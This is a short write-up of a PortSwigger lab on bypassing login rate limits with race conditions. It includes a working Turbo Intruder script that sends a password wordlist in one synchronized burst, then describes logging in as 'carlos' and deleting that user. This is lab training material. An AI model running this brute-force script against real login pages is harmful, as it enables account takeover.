# [Bypassing rate limits via race conditions] — [PortSwigger] — [Practitioner]
**Date:** 2026-08-06
 
---
 
## Vulnerability / core concept
Brute-force via Race Conditions

---


## Payload / key command
To exploit race conditions in this lab and perform password brute-force, I used Turbo Intruder.

This was the script that I used to exploit login page:
```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    wordlist = open('/home/babek/Desktop/pass.txt').read().splitlines()
    for w in wordlist:
        engine.queue(target.req, w, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

Here, I worked on the `race-single-packet-attack.py` example and modified it to be able to feed the wordlist that I want. After running this script, we can notice that one request has 302 code with redirection to `carlos` account. Now we can access `Admin panel` through `carlos`'s account and delete user `carlos`.
